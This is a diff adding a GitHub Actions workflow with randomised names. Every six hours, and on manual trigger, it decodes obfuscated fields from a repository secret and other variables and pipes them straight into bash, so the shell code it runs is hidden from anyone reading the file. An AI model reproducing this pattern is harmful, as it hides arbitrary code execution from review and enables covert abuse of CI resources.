@@ -1,0 +1,20 @@
+name: guoqingminus
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoqingminus
+        env:
+          fpgav3: ${{ secrets.fpgav3 }}
+        run: |
+          echo $fpgav3 | jq -r .gfam804 | /bin/bash
+          echo $loal583 | jq -r .thh8572 | /bin/bash
+          echo $zbhtc4 | jq -r .umpfa8985 | /bin/bash
+          echo $fqzej48 | jq -r .wbnlj6 | /bin/bash
+
